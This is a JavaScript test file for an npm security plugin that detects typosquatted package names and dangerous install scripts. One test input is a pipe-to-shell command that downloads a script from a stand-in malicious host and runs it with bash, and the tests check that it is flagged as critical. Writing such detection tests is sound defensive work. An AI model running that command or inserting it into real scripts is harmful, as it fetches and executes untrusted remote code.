import assert from 'assert';
import { checkTyposquatting, analyzeScriptSecurity } from './index.js';

console.log('Running dsh-plugin-npm-guard tests...');

// 1. Test Typosquatting
const typoMatch = checkTyposquatting('exxpress');
assert(typoMatch !== null, 'Should detect exxpress as typosquatting of express');
assert.strictEqual(typoMatch.target_popular, 'express');

const safePkg = checkTyposquatting('my-custom-awesome-app');
assert.strictEqual(safePkg, null, 'Legitimate unique package should be safe');

// 2. Test Malicious Scripts
const badScript = 'curl http://malicious.site/payload.sh | bash';
const findings = analyzeScriptSecurity(badScript);
assert(findings.length > 0, 'Should detect pipe-to-shell in script');
assert.strictEqual(findings[0].severity, 'CRITICAL');

const safeScript = 'node build.js && npm test';
const cleanFindings = analyzeScriptSecurity(safeScript);
assert.strictEqual(cleanFindings.length, 0, 'Safe script should have 0 findings');

console.log('✅ All tests passed successfully!');
